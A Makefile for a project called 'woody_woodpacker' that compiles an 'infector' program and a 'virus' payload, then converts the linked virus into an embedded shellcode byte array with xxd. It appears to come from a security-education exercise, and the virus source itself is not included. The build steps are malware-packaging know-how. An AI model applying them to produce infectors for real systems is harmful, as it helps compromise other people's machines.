NAME = woody_woodpacker

COMPILER = gcc
FLAGS = 

SRC_DIR				= .
TMP_DIR				= .tmp
OBJ_DIR				= $(TMP_DIR)/obj

SRC_C = virus.c lib/lib.c lib/remote.c
SRC_S = virus_start.s
OBJ	=	$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.o)) \
		$(addprefix $(OBJ_DIR)/, $(SRC_S:.s=.o))

SRC_INF_C = infector.c lib/lib.c
OBJ_INF	=	$(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.o))

VIRUS = $(TMP_DIR)/virus.template
VIRUS_X = $(TMP_DIR)/virus_shellcode.c

LD_RULES = virus_linking.lds

all: $(NAME)

$(NAME): $(OBJ_INF) $(VIRUS_X)
	$(COMPILER) $(FLAGS) -o $(NAME) $(OBJ_INF) $(VIRUS_X)

$(VIRUS_X): $(VIRUS)
	cp $(VIRUS) virus_shellcode
	xxd -i virus_shellcode > $(VIRUS_X)
	rm virus_shellcode

$(VIRUS): $(OBJ)
	ld -o $@ -T $(LD_RULES) $(OBJ)

$(TMP_DIR):
	mkdir -p $@

$(OBJ_DIR):
	mkdir -p $@
	mkdir -p .tmp/obj/lib

$(OBJ_DIR)/%.o: $(SRC_DIR)/%.c | $(OBJ_DIR)
	$(COMPILER) -MD -fno-stack-protector -fPIC -fPIE $(FLAGS) -c $< -o $@

$(OBJ_DIR)/%.o: $(SRC_DIR)/%.s | $(OBJ_DIR)
	nasm -f elf64 $< -o $@

clean:
	rm -rf .tmp/obj/virus.d .tmp/obj/infector.d
	rm -rf $(OBJ)
	rm -rf $(OBJ_DIR)
	rm -rf $(TMP_DIR)

fclean: clean
	rm -rf $(VIRUS)
	rm -rf $(NAME)

re: fclean
	$(MAKE)

-include .tmp/obj/virus.d .tmp/obj/infector.d .tmp/obj/lib/lib.d .tmp/obj/lib/remote.d .tmp/obj/lib/infect.d

.PHONY: all re clean fclean test

test: all
	(cd test && ./test.sh)
